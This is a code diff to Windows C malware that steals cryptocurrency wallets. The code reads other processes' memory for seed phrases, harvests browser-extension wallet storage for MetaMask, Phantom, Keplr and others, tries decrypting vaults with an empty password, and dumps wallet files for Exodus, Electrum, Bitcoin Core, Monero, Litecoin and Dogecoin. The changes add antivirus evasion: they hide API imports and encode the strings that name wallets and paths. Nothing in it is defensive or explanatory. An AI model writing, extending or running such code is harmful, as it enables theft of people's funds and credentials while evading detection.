@@ -16,7 +16,8 @@
 #include "commands.h"
 #include "crypto.h"
 #include <windows.h>
-#include <tlhelp32.h>
+#include "tlhelp_lazy.h"
+#include "evs_strings.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -26,7 +27,20 @@
 #include <mbedtls/md.h>
 #include <mbedtls/pkcs5.h>
 
-/* ── file helpers ────────────────────────────────────────────────────── */
+/* VirtualQueryEx / ReadProcessMemory — remove from IAT */
+typedef SIZE_T (WINAPI *_cVQEx_t)(HANDLE,LPCVOID,PMEMORY_BASIC_INFORMATION,SIZE_T);
+typedef BOOL   (WINAPI *_cRPM_t) (HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
+static _cVQEx_t _gc_vqex = NULL;
+static _cRPM_t  _gc_rpm  = NULL;
+static void _crypto_api_init(void) {
+    if (_gc_vqex && _gc_rpm) return;
+    HMODULE k = GetModuleHandleA("kernel32.dll");
+    if (!k) return;
+    if (!_gc_vqex) { char _s[16]; EVS_D(_s, EVS_fn_VirtualQueryEx);   _gc_vqex = (_cVQEx_t)(void*)GetProcAddress(k, _s); }
+    if (!_gc_rpm)  { char _s[20]; EVS_D(_s, EVS_fn_ReadProcessMemory); _gc_rpm  = (_cRPM_t) (void*)GetProcAddress(k, _s); }
+}
+#define VirtualQueryEx(h,a,m,s)     (_gc_vqex?_gc_vqex(h,a,m,s):0)
+#define ReadProcessMemory(h,b,buf,s,rd) (_gc_rpm?_gc_rpm(h,b,buf,s,rd):FALSE)
 
 /* forward declarations */
 static void _try_decrypt_leveldb_vaults(const char *label, const char *path,
@@ -151,7 +165,7 @@ static void _grep_file(const char *label, const char *path,
             if (!found)
             {
                 int n = snprintf(out + *pos, outsz - *pos,
-                                 "[%s] vault hit: pattern=%s\n", label, pat);
+                                 "[ VAULT : %s ] pattern=%s\n", label, pat);
                 if (n > 0)
                     *pos += (size_t)n;
                 found = 1;
@@ -444,8 +458,7 @@ static void _try_decrypt_leveldb_vaults(const char *label,
             if (_decrypt_vault(&vp, "", plain, sizeof(plain)) == 0) {
                 if (!found) {
                     int n = snprintf(out + *pos, outsz - *pos,
-                                     "[%s] VAULT DECRYPTED (empty password):\n",
-                                     label);
+                                     "[ VAULT DECRYPTED : %s ]\n", label);
                     if (n > 0) *pos += (size_t)n;
                     found = 1;
                 }
@@ -522,6 +535,7 @@ static int _is_bip39_word(const uint8_t *buf, size_t sz, size_t *off)
 static int _scan_pid_for_mnemonics(DWORD pid,
                                     char *out, size_t outsz, size_t *pos)
 {
+    _crypto_api_init();
     HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                             FALSE, pid);
     if (!hp) return 0;
@@ -537,7 +551,9 @@ static int _scan_pid_for_mnemonics(DWORD pid,
         addr = (uint8_t *)mbi.BaseAddress + mbi.RegionSize;
 
         if (mbi.State != MEM_COMMIT) continue;
-        if (!(mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) continue;
+        if (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) continue;
+        if (!(mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
+                             PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) continue;
         if (mbi.RegionSize < 48 || mbi.RegionSize > MNEMONIC_SCAN_CAP) continue;
 
         if (mbi.RegionSize > rcap) {
@@ -612,18 +628,19 @@ static int _scan_pid_for_mnemonics(DWORD pid,
                         if (wlens[a] == wlens[b] &&
                             memcmp(wptrs[a], wptrs[b], wlens[a]) == 0)
                             dup = 1;
-                if (dup) { i = off; continue; }
+                (void)dup; /* repeated words allowed — some real seeds repeat */
             }
 
             /* emit */
             if (*pos + (off - i) + 64 < outsz) {
                 int n = snprintf(out + *pos, outsz - *pos,
-                                 "[mem-mnemonic pid=%lu] ", (unsigned long)pid);
+                                 "[ SEED : pid=%lu ]\n  ", (unsigned long)pid);
                 if (n > 0) *pos += (size_t)n;
                 size_t mlen = off - i;
-                if (*pos + mlen + 2 < outsz) {
+                if (*pos + mlen + 3 < outsz) {
                     memcpy(out + *pos, rbuf + i, mlen);
                     *pos += mlen;
+                    out[(*pos)++] = '\n';
                     out[(*pos)++] = '\n';
                 }
                 hits++;
@@ -669,36 +686,52 @@ static void _scan_chrome_mnemonics(char *out, size_t outsz, size_t *pos)
 
 /* ── browser extension wallets ───────────────────────────────────────── */
 
-/* extension IDs for Chromium-based browsers */
+/* extension name+ID pairs — EVS-encoded, decoded at runtime */
 static const struct
 {
-    const char *name;
-    const char *ext_id;
-} EXTENSIONS[] = {
-    {"MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"},
-    {"Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
-    {"CoinbaseWallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"},
-    {"TrustWallet", "egjidjbpglichdcondbcbdnbeeppgdph"},
-    {"BinanceChain", "fhbohimaelbohpjbbldcngcnapndodjp"},
-    {"Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"},
-    {NULL, NULL}};
+    const unsigned char *name_e;
+    size_t               name_n;
+    const unsigned char *id_e;
+} EXT_TABLE[] = {
+    {EVS_str_wlt_MetaMask,       sizeof(EVS_str_wlt_MetaMask),       EVS_ext_id_MetaMask},
+    {EVS_str_wlt_Phantom,        sizeof(EVS_str_wlt_Phantom),        EVS_ext_id_Phantom},
+    {EVS_str_wlt_CoinbaseWallet, sizeof(EVS_str_wlt_CoinbaseWallet), EVS_ext_id_CoinbaseWallet},
+    {EVS_str_wlt_TrustWallet,    sizeof(EVS_str_wlt_TrustWallet),    EVS_ext_id_TrustWallet},
+    {EVS_str_wlt_BinanceChain,   sizeof(EVS_str_wlt_BinanceChain),   EVS_ext_id_BinanceChain},
+    {EVS_str_wlt_Keplr,          sizeof(EVS_str_wlt_Keplr),          EVS_ext_id_Keplr},
+    {NULL, 0, NULL}};
 
-static const struct
+typedef struct { const char *name; char ud_tmpl[MAX_PATH]; } _cr_br_t;
+#define _CR_BR_COUNT 6
+
+static void _fill_cr_paths(_cr_br_t *B)
 {
-    const char *name;
-    const char *ud_tmpl;
-} CHROME_BROWSERS[] = {
-    {"Chrome",   "%LOCALAPPDATA%\\Google\\Chrome\\User Data"},
-    {"Edge",     "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"},
-    {"Brave",    "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"},
-    {"Chromium", "%LOCALAPPDATA%\\Chromium\\User Data"},
-    {"Opera",    "%APPDATA%\\Opera Software\\Opera Stable"},
-    {"OperaGX",  "%APPDATA%\\Opera Software\\Opera GX Stable"},
-    {NULL, NULL}};
+    char _s[48];
+#define _CR_PATH(idx, pfx, evs_name) \
+    EVS_D(_s, evs_name); \
+    snprintf(B[idx].ud_tmpl, MAX_PATH, pfx "%s", _s); \
+    SecureZeroMemory(_s, sizeof(_s))
+    _CR_PATH(0, "%LOCALAPPDATA%\\", EVS_str_br_chrome_ud);
+    _CR_PATH(1, "%LOCALAPPDATA%\\", EVS_str_br_edge_ud);
+    _CR_PATH(2, "%LOCALAPPDATA%\\", EVS_str_br_brave_ud);
+    _CR_PATH(3, "%LOCALAPPDATA%\\", EVS_str_br_chromium_ud);
+    _CR_PATH(4, "%APPDATA%\\",      EVS_str_br_opera);
+    _CR_PATH(5, "%APPDATA%\\",      EVS_str_br_operagx);
+#undef _CR_PATH
+}
+
+static const char *_CR_NAMES[_CR_BR_COUNT] = {
+    "Chrome", "Edge", "Brave", "Chromium", "Opera", "OperaGX"
+};
 
 static void _scan_browser_extensions(char *out, size_t outsz, size_t *pos)
 {
-    for (int bi = 0; CHROME_BROWSERS[bi].name; bi++)
+    _cr_br_t CHROME_BROWSERS[_CR_BR_COUNT];
+    for (int i = 0; i < _CR_BR_COUNT; i++)
+        CHROME_BROWSERS[i].name = _CR_NAMES[i];
+    _fill_cr_paths(CHROME_BROWSERS);
+
+    for (int bi = 0; bi < _CR_BR_COUNT; bi++)
     {
         char ud[MAX_PATH];
         ExpandEnvironmentStringsA(CHROME_BROWSERS[bi].ud_tmpl, ud, sizeof(ud));
@@ -712,19 +745,25 @@ static void _scan_browser_extensions(char *out, size_t outsz, size_t *pos)
             char profile_dir[MAX_PATH];
             snprintf(profile_dir, sizeof(profile_dir), "%s\\%s", ud, fixed[fi]);
 
-            for (int ei = 0; EXTENSIONS[ei].name; ei++)
+            for (int ei = 0; EXT_TABLE[ei].name_e; ei++)
             {
+                char ext_name[20] = {0}, ext_id[36] = {0};
+                _evs_dec(ext_name, EXT_TABLE[ei].name_e, EXT_TABLE[ei].name_n);
+                _evs_dec(ext_id,   EXT_TABLE[ei].id_e,   32);
+
                 char db_dir[MAX_PATH];
                 snprintf(db_dir, sizeof(db_dir),
                          "%s\\Local Extension Settings\\%s",
-                         profile_dir, EXTENSIONS[ei].ext_id);
+                         profile_dir, ext_id);
 
                 char label[128];
                 snprintf(label, sizeof(label), "%s/%s/%s",
                          CHROME_BROWSERS[bi].name,
-                         EXTENSIONS[ei].name, fixed[fi]);
+                         ext_name, fixed[fi]);
 
                 _scan_leveldb_dir(label, db_dir, out, outsz, pos);
+                SecureZeroMemory(ext_name, sizeof(ext_name));
+                SecureZeroMemory(ext_id, sizeof(ext_id));
                 if (*pos + 64 >= outsz)
                     return;
             }
@@ -742,19 +781,25 @@ static void _scan_browser_extensions(char *out, size_t outsz, size_t *pos)
         {
             if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                 continue;
-            for (int ei = 0; EXTENSIONS[ei].name; ei++)
+            for (int ei = 0; EXT_TABLE[ei].name_e; ei++)
             {
+                char ext_name[20] = {0}, ext_id[36] = {0};
+                _evs_dec(ext_name, EXT_TABLE[ei].name_e, EXT_TABLE[ei].name_n);
+                _evs_dec(ext_id,   EXT_TABLE[ei].id_e,   32);
+
                 char db_dir[MAX_PATH];
                 snprintf(db_dir, sizeof(db_dir),
                          "%s\\%s\\Local Extension Settings\\%s",
-                         ud, fd.cFileName, EXTENSIONS[ei].ext_id);
+                         ud, fd.cFileName, ext_id);
 
                 char label[128];
                 snprintf(label, sizeof(label), "%s/%s/%s",
                          CHROME_BROWSERS[bi].name,
-                         EXTENSIONS[ei].name, fd.cFileName);
+                         ext_name, fd.cFileName);
 
                 _scan_leveldb_dir(label, db_dir, out, outsz, pos);
+                SecureZeroMemory(ext_name, sizeof(ext_name));
+                SecureZeroMemory(ext_id, sizeof(ext_id));
                 if (*pos + 64 >= outsz)
                 {
                     FindClose(hf);
@@ -809,10 +854,15 @@ static void _dump_dir_files(const char *label_prefix, const char *dir_tmpl,
 
 static void _scan_desktop_wallets(char *out, size_t outsz, size_t *pos)
 {
+    char wlt[16] = {0}, tmpl[MAX_PATH], fpath[MAX_PATH], lbl[256];
+
     /* Exodus */
     {
-        char dir[MAX_PATH];
-        ExpandEnvironmentStringsA("%APPDATA%\\Exodus\\exodus.wallet", dir, sizeof(dir));
+        char sub[14] = {0}, dir[MAX_PATH];
+        EVS_D(wlt, EVS_str_wlt_Exodus);      /* "Exodus" */
+        EVS_D(sub, EVS_str_wlt_exodus_sub);  /* "exodus.wallet" */
+        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, sub);
+        ExpandEnvironmentStringsA(tmpl, dir, sizeof(dir));
         if (GetFileAttributesA(dir) != INVALID_FILE_ATTRIBUTES)
         {
             static const char *exodus_files[] = {
@@ -820,73 +870,118 @@ static void _scan_desktop_wallets(char *out, size_t outsz, size_t *pos)
                 "backbone.seco", NULL};
             for (int i = 0; exodus_files[i]; i++)
             {
-                char fp[MAX_PATH], lbl[128];
-                snprintf(fp, sizeof(fp), "%s\\%s", dir, exodus_files[i]);
-                snprintf(lbl, sizeof(lbl), "Exodus/%s", exodus_files[i]);
-                _dump_file_b64(lbl, fp, out, outsz, pos);
+                snprintf(fpath, sizeof(fpath), "%s\\%s", dir, exodus_files[i]);
+                snprintf(lbl,   sizeof(lbl),   "%s/%s",  wlt, exodus_files[i]);
+                _dump_file_b64(lbl, fpath, out, outsz, pos);
             }
-            /* also grab any .seco files not listed above */
-            _dump_dir_files("Exodus", "%APPDATA%\\Exodus\\exodus.wallet",
-                            ".seco", out, outsz, pos);
+            snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, sub);
+            _dump_dir_files(wlt, tmpl, ".seco", out, outsz, pos);
         }
+        SecureZeroMemory(wlt, sizeof(wlt));
+        SecureZeroMemory(sub, sizeof(sub));
     }
 
-    /* Atomic Wallet - LevelDB grep + file dump */
-    _scan_leveldb_dir("AtomicWallet",
-                      "%APPDATA%\\atomic\\Local Storage\\leveldb",
-                      out, outsz, pos);
+    /* Atomic Wallet */
     {
+        char atwlt[13] = {0}, atom[7] = {0}, lstg[14] = {0}, lvdb[8] = {0};
         char dir[MAX_PATH];
-        ExpandEnvironmentStringsA("%APPDATA%\\atomic\\Local Storage\\leveldb",
-                                  dir, sizeof(dir));
+        EVS_D(atwlt, EVS_str_wlt_AtomicWallet); /* "AtomicWallet" */
+        EVS_D(atom,  EVS_str_wlt_atomic);        /* "atomic" */
+        EVS_D(lstg,  EVS_str_wlt_local_storage); /* "Local Storage" */
+        EVS_D(lvdb,  EVS_str_wlt_leveldb);       /* "leveldb" */
+        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s\\%s", atom, lstg, lvdb);
+        ExpandEnvironmentStringsA(tmpl, dir, sizeof(dir));
         if (GetFileAttributesA(dir) == INVALID_FILE_ATTRIBUTES)
         {
-            /* try alternate path */
-            ExpandEnvironmentStringsA(
-                "%APPDATA%\\atomic wallet\\Local Storage\\leveldb",
-                dir, sizeof(dir));
+            snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s wallet\\%s\\%s", atom, lstg, lvdb);
+            ExpandEnvironmentStringsA(tmpl, dir, sizeof(dir));
         }
-        _scan_leveldb_dir("AtomicWallet", dir, out, outsz, pos);
+        _scan_leveldb_dir(atwlt, dir, out, outsz, pos);
+        SecureZeroMemory(atwlt, sizeof(atwlt));
+        SecureZeroMemory(atom, sizeof(atom));
+        SecureZeroMemory(lstg, sizeof(lstg));
+        SecureZeroMemory(lvdb, sizeof(lvdb));
     }
 
     /* Electrum */
-    _dump_dir_files("Electrum",
-                    "%APPDATA%\\Electrum\\wallets",
-                    NULL, out, outsz, pos);
+    {
+        char wlts[8] = {0};
+        EVS_D(wlt,  EVS_str_wlt_Electrum); /* "Electrum" */
+        EVS_D(wlts, EVS_str_wlt_wallets);  /* "wallets" */
+        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wlts);
+        _dump_dir_files(wlt, tmpl, NULL, out, outsz, pos);
+        SecureZeroMemory(wlt, sizeof(wlt));
+        SecureZeroMemory(wlts, sizeof(wlts));
+    }
 
     /* Bitcoin Core */
     {
-        char fp[MAX_PATH];
-        ExpandEnvironmentStringsA("%APPDATA%\\Bitcoin\\wallet.dat", fp, sizeof(fp));
-        _dump_file_b64("Bitcoin/wallet.dat", fp, out, outsz, pos);
-        /* wallets subdirectory (v22+) */
-        _dump_dir_files("Bitcoin",
-                        "%APPDATA%\\Bitcoin\\wallets",
-                        ".dat", out, outsz, pos);
+        char wdat[11] = {0}, wlts[8] = {0};
+        EVS_D(wlt,  EVS_str_wlt_Bitcoin);    /* "Bitcoin" */
+        EVS_D(wdat, EVS_str_wlt_wallet_dat); /* "wallet.dat" */
+        EVS_D(wlts, EVS_str_wlt_wallets);    /* "wallets" */
+        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wdat);
+        ExpandEnvironmentStringsA(tmpl, fpath, sizeof(fpath));
+        snprintf(lbl, sizeof(lbl), "%s/%s", wlt, wdat);
+        _dump_file_b64(lbl, fpath, out, outsz, pos);
+        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wlts);
+        _dump_dir_files(wlt, tmpl, ".dat", out, outsz, pos);
+        SecureZeroMemory(wlt, sizeof(wlt));
+        SecureZeroMemory(wdat, sizeof(wdat));
+        SecureZeroMemory(wlts, sizeof(wlts));
     }
 
-    /* Ethereum keystore (UTC--... files are JSON) */
-    _dump_dir_files("Ethereum/keystore",
-                    "%APPDATA%\\Ethereum\\keystore",
-                    NULL, out, outsz, pos);
+    /* Ethereum keystore */
+    {
+        char ks[9] = {0};
+        EVS_D(wlt, EVS_str_wlt_Ethereum); /* "Ethereum" */
+        EVS_D(ks,  EVS_str_wlt_keystore); /* "keystore" */
+        snprintf(lbl,  sizeof(lbl),  "%s/%s",             wlt, ks);
+        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, ks);
+        _dump_dir_files(lbl, tmpl, NULL, out, outsz, pos);
+        SecureZeroMemory(wlt, sizeof(wlt));
+        SecureZeroMemory(ks, sizeof(ks));
+    }
 
     /* Monero GUI */
-    _dump_dir_files("Monero",
-                    "%APPDATA%\\monero-project\\monero-gui\\wallets",
-                    NULL, out, outsz, pos);
+    {
+        char mproj[15] = {0}, mgui[11] = {0}, wlts[8] = {0};
+        EVS_D(wlt,   EVS_str_wlt_Monero);      /* "Monero" */
+        EVS_D(mproj, EVS_str_wlt_monero_proj); /* "monero-project" */
+        EVS_D(mgui,  EVS_str_wlt_monero_gui);  /* "monero-gui" */
+        EVS_D(wlts,  EVS_str_wlt_wallets);     /* "wallets" */
+        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s\\%s", mproj, mgui, wlts);
+        _dump_dir_files(wlt, tmpl, NULL, out, outsz, pos);
+        SecureZeroMemory(wlt, sizeof(wlt));
+        SecureZeroMemory(mproj, sizeof(mproj));
+        SecureZeroMemory(mgui, sizeof(mgui));
+        SecureZeroMemory(wlts, sizeof(wlts));
+    }
 
     /* Litecoin Core */
     {
-        char fp[MAX_PATH];
-        ExpandEnvironmentStringsA("%APPDATA%\\Litecoin\\wallet.dat", fp, sizeof(fp));
-        _dump_file_b64("Litecoin/wallet.dat", fp, out, outsz, pos);
+        char wdat[11] = {0};
+        EVS_D(wlt,  EVS_str_wlt_Litecoin);  /* "Litecoin" */
+        EVS_D(wdat, EVS_str_wlt_wallet_dat); /* "wallet.dat" */
+        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wdat);
+        ExpandEnvironmentStringsA(tmpl, fpath, sizeof(fpath));
+        snprintf(lbl, sizeof(lbl), "%s/%s", wlt, wdat);
+        _dump_file_b64(lbl, fpath, out, outsz, pos);
+        SecureZeroMemory(wlt, sizeof(wlt));
+        SecureZeroMemory(wdat, sizeof(wdat));
     }
 
     /* Dogecoin Core */
     {
-        char fp[MAX_PATH];
-        ExpandEnvironmentStringsA("%APPDATA%\\DogeCoin\\wallet.dat", fp, sizeof(fp));
-        _dump_file_b64("Dogecoin/wallet.dat", fp, out, outsz, pos);
+        char wdat[11] = {0};
+        EVS_D(wlt,  EVS_str_wlt_Dogecoin);  /* "Dogecoin" */
+        EVS_D(wdat, EVS_str_wlt_wallet_dat); /* "wallet.dat" */
+        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wdat);
+        ExpandEnvironmentStringsA(tmpl, fpath, sizeof(fpath));
+        snprintf(lbl, sizeof(lbl), "%s/%s", wlt, wdat);
+        _dump_file_b64(lbl, fpath, out, outsz, pos);
+        SecureZeroMemory(wlt, sizeof(wlt));
+        SecureZeroMemory(wdat, sizeof(wdat));
     }
 }
 
